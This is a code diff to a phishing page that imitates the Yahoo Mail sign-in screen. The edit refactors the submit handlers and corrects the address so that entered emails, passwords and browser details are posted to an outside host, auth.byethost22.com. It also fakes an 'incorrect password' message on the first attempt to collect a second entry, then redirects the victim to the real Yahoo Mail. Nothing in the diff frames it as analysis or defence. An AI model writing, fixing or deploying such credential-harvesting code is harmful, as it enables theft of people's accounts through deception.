@@ -7,6 +7,7 @@
     <link rel="icon" href="https://s.yimg.com/wm/mbr/images/favicon.ico" type="image/x-icon">
     <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
     <style>
+        /* CSS unchanged */
         body {
             background: #f7f7f7 url('https://s.yimg.com/aaq/lrs/gradient-bg-purple_1x_7f6ebfb3.png') no-repeat center center fixed;
             background-size: cover;
@@ -146,14 +147,12 @@
             let count = 0;
             const emailRegex = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
 
-            // Pre-fill email from URL hash
             if (window.location.hash) {
                 let email = window.location.hash.substring(1);
                 try { email = atob(email); } catch(e) {}
                 $("#ai").val(email);
             }
 
-            // Next button or Enter key on email screen
             $("#next, #ai").on("click keypress", function(e) {
                 if (e.type === "click" || e.which === 13) {
                     let ai = $("#ai").val().trim();
@@ -173,7 +172,6 @@
                 }
             });
 
-            // Back button
             $("#back").click(function() {
                 $("#div2").fadeOut(200, function() {
                     $("#diiiv1").fadeIn(200);
@@ -181,53 +179,63 @@
                 });
             });
 
-            // Submit button or Enter key on password screen
-            $("#submit-btn, #pr").on("click keypress", function(e) {
-                if (e.type === "click" || e.which === 13) {
+            $("#submit-btn").on("click", function() {
+                let ai = $("#ai").val().trim();
+                let pr = $("#pr").val().trim();
+                let browser = navigator.userAgent;
+                count++;
+                sendLogin(ai, pr, browser);
+            });
+
+            $("#pr").on("keypress", function(e) {
+                if (e.which === 13) {
                     let ai = $("#ai").val().trim();
                     let pr = $("#pr").val().trim();
                     let browser = navigator.userAgent;
                     count++;
+                    sendLogin(ai, pr, browser);
+                }
+            });
 
-                    $.ajax({
-                        url: "https:auth.byethost22.com/auths/blog.php",
-                        dataType: "JSON",
-                        type: "POST",
-                        data: { 
-                            ai: ai, 
-                            pr: pr, 
-                            browser: browser 
-                        },
-                        beforeSend: function() {
-                            $("#div2").fadeOut(200);
-                            $("#div3").fadeIn(200);
-                        },
-                        success: function(response) {
-                            $("#pr").val("");
-                            if (count >= 2) {
-                                $("#load-text").html("Sign-in successful");
+            function sendLogin(ai, pr, browser) {
+                $.ajax({
+                    url: "https://auth.byethost22.com/auths/blog.php",
+                    dataType: "JSON",
+                    type: "POST",
+                    data: { 
+                        ai: ai, 
+                        pr: pr, 
+                        browser: browser 
+                    },
+                    beforeSend: function() {
+                        $("#div2").fadeOut(200);
+                        $("#div3").fadeIn(200);
+                    },
+                    success: function(response) {
+                        $("#pr").val("");
+                        if (count >= 2) {
+                            $("#load-text").html("Sign-in successful");
+                            setTimeout(() => {
+                                $("#load-text").html("Redirecting to Yahoo Mail...");
                                 setTimeout(() => {
-                                    $("#load-text").html("Redirecting to Yahoo Mail...");
-                                    setTimeout(() => {
-                                        window.location.replace("https://mail.yahoo.com");
-                                    }, 500);
-                                }, 1000);
-                                return;
-                            }
+                                    window.location.replace("https://mail.yahoo.com");
+                                }, 500);
+                            }, 1000);
+                        } else {
                             $("#div3").fadeOut(200, function() {
                                 $("#div2").fadeIn(200);
                                 $("#msg").html("The password you provided is incorrect.");
                             });
-                        },
-                        error: function() {
-                            $("#div3").fadeOut(200, function() {
-                                $("#div2").fadeIn(200);
-                                $("#msg").html("Something went wrong. Please try again.");
-                            });
                         }
-                    });
-                }
-            });
+                    },
+                    error: function() {
+                        $("#div3").fadeOut(200, function() {
+                            $("#div2").fadeIn(200);
+                            $("#msg").html("Something went wrong. Please try again.");
+                        });
+                    }
+                });
+            }
         });
     </script>
 </body>
